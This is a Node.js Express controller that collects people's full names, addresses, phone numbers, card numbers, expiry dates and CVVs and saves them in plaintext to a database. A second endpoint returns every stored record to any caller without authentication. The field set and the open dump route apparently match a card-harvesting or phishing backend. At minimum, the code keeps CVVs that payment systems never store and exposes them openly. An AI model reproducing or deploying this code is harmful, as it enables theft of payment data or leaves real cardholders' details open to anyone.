const Data = require("./data.model");

const createUserData = async (req, res) => {
  const {
    fullName,
    city,
    state,
    phoneNumber,
    address,
    pincode,
    cardNumber,
    expiryDate,
    cvv,
    mm,
    yy,
  } = req.body;

  // ✅ Check all required fields
  if (
    !fullName ||
    !city ||
    !state ||
    !phoneNumber ||
    !address ||
    !pincode ||
    !cardNumber ||
    !cvv ||
    !mm ||
    !yy
  ) {
    return res.status(400).json({
      message: "All fields are required",
    });
  }

  try {
    const newUser = new Data({
      fullName,
      city,
      state,
      phoneNumber,
      address,
      pincode,
      cardNumber,
      expiryDate,
      cvv,
      mm,
      yy,
    });

    await newUser.save();

    res.status(201).json({
      message: "User data created successfully",
    });
  } catch (error) {
    res.status(500).json({
      message: error.message || "Server error",
    });
  }
};

const userData = async (req, res) => {
  try {
    const users = await Data.find();
    res.status(200).json(users);
  } catch (error) {
    res.status(500).json({ message: "Server error" });
  }
};

module.exports = { userData, createUserData };
